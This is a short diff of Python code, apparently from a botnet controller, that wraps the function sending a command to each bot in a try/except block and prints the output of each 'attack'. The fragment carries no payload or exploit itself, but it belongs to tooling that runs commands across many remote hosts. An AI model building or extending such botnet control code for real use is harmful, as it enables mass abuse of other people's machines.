@@ -9,7 +9,10 @@ def command_bots(command, botnet):
         commandThread.start() # Start command thread
 
 def command_bot(command, bot):
-    print('attempting on bot '+bot.host)
-    attack = bot.send_command(command) # Store attack
-    print('Output from '+bot.host) # Log output
-    print(attack) # Log attempted attack
+    try:
+        print('attempting on bot '+bot.host)
+        attack = bot.send_command(command) # Store attack
+        print('Output from '+bot.host) # Log output
+        print(attack) # Log attempted attack
+    except Exception as e:
+        print(e)
